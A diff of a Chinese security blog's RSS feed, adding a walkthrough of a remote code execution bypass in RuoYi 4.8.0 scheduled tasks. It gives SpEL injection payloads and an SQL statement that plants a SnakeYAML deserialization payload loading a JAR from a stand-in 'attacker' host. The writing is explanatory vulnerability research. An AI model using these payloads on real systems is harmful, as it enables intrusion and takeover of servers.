@@ -1347,6 +1347,18 @@ DNSLOG&lt;/p&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;
 &lt;span class=&#34;line&#34;&gt;&lt;span&gt;fragment=__$&amp;#123;T%20(java.lang.Runtime).getRuntime().exec(&#39;open -a calculator&#39;)&amp;#125;__::.x&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
 &lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;cacheName=123&amp;#x26;fragment=$&amp;#123;T (java.lang.Runtime).getRuntime().exec(“calc.exe”)&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;ruoyi480计划任务rce&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ruoyi480计划任务rce&#34;&gt;#&lt;/a&gt; RuoYi4.8.0计划任务RCE&lt;/h2&gt;
+&lt;p&gt;在4.8.0中，黑名单变得严格，直接输入RCE payload会被Controller拦截&lt;/p&gt;
+&lt;p&gt;后台目前限制：&lt;code&gt;invokeTarget&lt;/code&gt;必须包含&lt;code&gt;com.ruoyi.quartz.task&lt;/code&gt;字符串&lt;/p&gt;
+&lt;p&gt;攻击思路是利用合法Bean执行SQL注入，通过SQL篡改数据库绕过代码层黑名单从而触发RCE&lt;/p&gt;
+&lt;p&gt;首先在利用合法Bean执行SQL注入中，我们可以寻找RuoYi Spring容器中默认存在、且未被加入黑名单的Bean来执行SQL语句，常见的是：&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;jdbcTemplate：Spring自带的数据库操作类，可以构造jdbcTemplate.execute(&#34;SQL语句&#34;)&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;line&#34;&gt;&lt;span&gt;genTableServiceImpl：若依自带的代码生成器服务，可以构造genTableServiceImpl.createTable(&#34;SQL语句&#34;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;由于这两个Bean的名字和&lt;code&gt;execute/createTable&lt;/code&gt;方法都不在黑名单中，所以该任务会被成功保存到数据库中，之后，可以执行如下SQL修改定时任务配置：&lt;/p&gt;
+&lt;pre class=&#34;shiki shiki-themes vitesse-light vitesse-dark&#34; style=&#34;background-color:#ffffff;--shiki-dark-bg:#121212;color:#393a34;--shiki-dark:#dbd7caee&#34; tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span&gt;UPDATE sys_job SET invoke_target = &#39;org.yaml.snakeyaml.Yaml.load(&#39;&#39;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&#34;http://attacker/exp.jar&#34;]]]]&#39;&#39;)&#39; WHERE job_id = 1;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;当定时任务第一次触发时，这条SQL被执行，它直接在数据库层面将该任务的&lt;code&gt;invokeTarget&lt;/code&gt;替换为包含高位关键字（如&lt;code&gt;snakeyaml&lt;/code&gt;和&lt;code&gt;http&lt;/code&gt;）的恶意payload，关键在于数据库底层的修改完全绕过了若依Controller层的代码黑名单校验&lt;/p&gt;
+&lt;p&gt;当该定时任务第二次触发时，Quartz会直接从数据库中读取被篡改的&lt;code&gt;invokeTarget&lt;/code&gt;并执行，此时恶意的SnakeYAML反序列化payload被触发加载远程或本地上传的恶意JAR包，最终导致RCE或被注入内存马&lt;/p&gt;
+&lt;p&gt;参考文章中写的特别详细，但是ZLARYY......能力有限QAQ&lt;/p&gt;
  ]]></description>
         </item>
         <item>
